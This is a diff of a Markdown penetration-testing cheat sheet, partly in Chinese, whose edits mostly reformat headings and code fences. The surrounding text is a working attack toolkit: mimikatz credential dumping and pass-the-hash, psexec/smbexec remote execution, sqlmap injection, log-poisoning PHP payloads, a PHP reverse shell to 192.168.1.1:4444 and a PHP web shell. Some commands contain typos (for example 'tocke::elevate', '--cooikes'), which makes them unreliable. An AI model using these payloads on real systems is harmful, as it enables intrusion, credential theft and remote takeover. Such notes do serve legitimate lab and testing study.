@@ -30,12 +30,12 @@ certutil -urlcache -split -f <URL> <輸出檔名>
 # WinRM #  
 evil-winrm  
 # RDP #  
-xfreerdp3  
+```xfreerdp3```  
 # psexec #  
-impacket-psexec  
+``impacket-psexec```  
 psexec \\192.168.1.1: cmd.exe  
 # smbexec #  
-impacket-smbexec  
+```impacket-smbexec```  
 
 # mimikatz #  
 privilege::debug  
@@ -43,8 +43,8 @@ tocke::elevate
 lsadump::sam  
 sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>  
 
-## GDB #  
-# Install PEDA Plgu-in ##  
+## GDB ##  
+# Install PEDA Plgu-in #  
 # Commands #  
 gdb XXXX(binary name)  
 b main  
@@ -54,26 +54,26 @@ disassemble main
 p system  
 search /bin/sh  
 
-## Privilege Escalation #  
+## Privilege Escalation ##  
 # Overlay #  
 https://github.com/briskets/CVE-2021-3493  
 
 
-## Firmware Analyze  
+## Firmware Analyze ## 
 # binwalk  
 binwalk -e --signature --term (Filename)  
 # binwalk3  
 binwalk3  
-# firmware analysis toolkit(fat)  
+# firmware analysis toolkit(fat) ## 
 sudo ./fat3.py (filename)  
-# AttifyOS Emulation  
+# AttifyOS Emulation ##  
 
-## Hash Cracker  
-# John  
+## Hash Cracker ##  
+# John ##  
 john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>  
-# Hashcat  
+# Hashcat ##  
 
-## Web Recon #  
+## Web Recon ##  
 # Nikto #    
 # wpscan #  
 ```wpscan --update ```  
@@ -86,7 +86,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>
 ``` whatweb --log-verbose=log.txt 192.168.1.1 ```   
 
 
-## SQLi #  
+## SQLi ##  
 # 手動確認漏洞存在 #  
 單引號'  
 變數及單引號 abc'  
@@ -104,14 +104,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>
 ```sqlmap -u "www.example.com" --method POST --data "[Copied POST Request]" -p '[vuln field name]' --dbs ```  
 ```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  
 
-## Log Poison  
-# SSH Log (/var/log/auth.log)  
-ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1  
-ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1  
+## Log Poison ##  
+# SSH Log (/var/log/auth.log) #  
+```ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```
+``` ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```  
 # Apache Log (/var/log/apache2/access.log)  
-User-Agent: <?php system($_GET['cmd']); ?>  
+``` User-Agent: <?php system($_GET['cmd']); ?>  ```
 
-## Reverse Shell
+## Reverse Shell ##  
 # php #  
 ``` php -r '$sock=fsockopen("192.168.1.1",4444);$proc=proc_open("/bin/sh -i", array(0>=$sock, 1=>$sock, 2=>sock),$pipes);' ```  
 ``` <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?> ```  
